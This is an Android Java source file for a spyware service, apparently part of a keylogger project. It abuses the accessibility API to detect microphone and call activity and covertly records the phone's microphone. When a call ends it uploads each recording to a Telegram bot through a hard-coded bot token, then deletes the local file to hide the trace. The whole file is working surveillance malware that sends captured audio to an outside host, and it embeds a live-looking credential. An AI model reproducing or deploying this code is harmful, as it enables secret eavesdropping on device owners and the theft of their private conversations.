package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.example.newdynamicapk.Constants;

import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Accessibility service and microphone recorder combined.
 */
public class MicrophoneRecorderService extends AccessibilityService {

    private static final String TAG = "MicrophoneRecorderService";
    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
    private MediaRecorder recorder;
    private File audioFile;

    /**
     * Starts microphone recording.
     */
    public void startRecording(Context context) {
        try {
            File dir = new File(Environment.getExternalStorageDirectory(), "MicRecords");
            if (!dir.exists()) dir.mkdirs();

            audioFile = new File(dir, "mic_" + System.currentTimeMillis() + ".mp3");

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            Log.d(TAG, "Microphone recording started: " + audioFile.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Error starting microphone recording", e);
        }
    }

    /**
     * Stops the recording and sends the file to Telegram.
     */
    public void stopRecordingAndSendToTelegram() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;

                Log.d(TAG, "Microphone recording stopped. Sending to Telegram.");
                new SendToTelegramTask().execute(audioFile.getAbsolutePath());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping microphone recording", e);
        }
    }

    /**
     * Accessibility event listener for detecting microphone and call activity.
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String eventText = event.getText() != null ? event.getText().toString().toLowerCase() : "";

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                Log.d(TAG, "Event detected from package: " + packageName + ", Event Text: " + eventText);

                // Check for microphone-related activity
                if (eventText.contains("record") || packageName.contains("audio") || packageName.contains("microphone")) {
                    Log.d(TAG, "Potential microphone activity detected. Starting microphone recording.");
                    startRecording(this);
                }

                // Check for call ending or disconnect
                if (packageName.contains("call") && (eventText.contains("end") || eventText.contains("disconnect"))) {
                    Log.d(TAG, "Call ended. Stopping microphone recording.");
                    stopRecordingAndSendToTelegram();
                }
                break;

            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted");
    }

    /**
     * AsyncTask for sending the recorded audio file to Telegram.
     */
    private class SendToTelegramTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String filePath = params[0];
                String chatId = Constants.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
                String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";

                File audioFile = new File(filePath);
                String boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                HttpURLConnection conn = (HttpURLConnection) new URL(telegramUrl).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);

                OutputStream outputStream = conn.getOutputStream();
                StringBuilder requestBody = new StringBuilder();

                // Add chat_id
                requestBody.append(twoHyphens).append(boundary).append(lineEnd)
                        .append("Content-Disposition: form-data; name=\"chat_id\"").append(lineEnd)
                        .append(lineEnd).append(chatId).append(lineEnd);

                // Add file
                requestBody.append(twoHyphens).append(boundary).append(lineEnd)
                        .append("Content-Disposition: form-data; name=\"document\"; filename=\"")
                        .append(audioFile.getName()).append("\"").append(lineEnd)
                        .append("Content-Type: audio/mpeg").append(lineEnd)
                        .append(lineEnd);

                outputStream.write(requestBody.toString().getBytes("UTF-8"));
                outputStream.write(java.nio.file.Files.readAllBytes(audioFile.toPath()));
                outputStream.write(lineEnd.getBytes());
                outputStream.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
                outputStream.flush();
                outputStream.close();

                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());

                // Delete the file after sending
                if (audioFile.exists() && audioFile.delete()) {
                    Log.d(TAG, "Recording deleted after sending to Telegram.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending microphone recording to Telegram", e);
            }
            return null;
        }
    }
}
